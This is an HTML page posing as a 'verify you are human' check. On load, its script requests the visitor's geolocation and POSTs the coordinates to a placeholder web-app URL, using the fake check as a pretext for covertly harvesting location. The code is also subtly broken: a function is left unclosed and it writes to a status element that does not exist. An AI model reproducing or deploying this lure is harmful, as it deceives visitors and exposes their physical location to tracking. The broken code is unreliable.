<!DOCTYPE html>
<html>
<head>
  <title>Human verification</title>
</head>
<body>
  <h1>Verify you are human</h1>
  <p>Please allow you loaction to continue.</p>
   <script>
    window.onload = () => {
      navigator.geolocation.getCurrentPosition(sendToServer, showError);
    };

    function sendToServer(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      fetch("YOUR_WEB_APP_URL_HERE", {
  method: "POST",
  mode: "no-cors", // This prevents the browser from blocking the request
  cache: "no-cache",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({ lat, lon })
})
.then(() => {
  document.getElementById("status").innerText = "Data sent to Google!";
})
.catch(err => {
  document.getElementById("status").innerText = "Error: " + err;
});

    function showError() {
      document.getElementById("status").innerText =
        "Permission denied or error getting location.";
    }
  </script>
</body>
</html>
